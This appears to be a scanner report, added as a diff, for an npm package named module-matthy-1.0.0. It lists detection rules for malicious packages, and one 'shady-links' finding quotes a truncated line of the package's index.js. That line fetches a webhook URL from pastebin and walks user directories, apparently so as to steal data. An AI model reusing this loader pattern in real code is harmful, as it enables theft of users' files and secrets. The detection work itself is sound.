@@ -1,0 +1,22 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "npm-install-script": {},
+        "npm-obfuscation": {},
+        "shady-links": [
+            {
+                "location": "package/index.js:1",
+                "code": "const fs=require(\"fs\"),axios=require(\"axios\"),fetch=require(\"node-fetch\"),webhook=async()=>(await axios.get(\"https://pastebin.com/raw/gUKcsvAX\").catch((()=>{}))).data;var paths=[`${__dirname.split(\":\")[0]}:/Users/${__dirname.split(\"\\\\\")[2]}.../json\"}})}",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/module-matthy-1.0.0"
+}
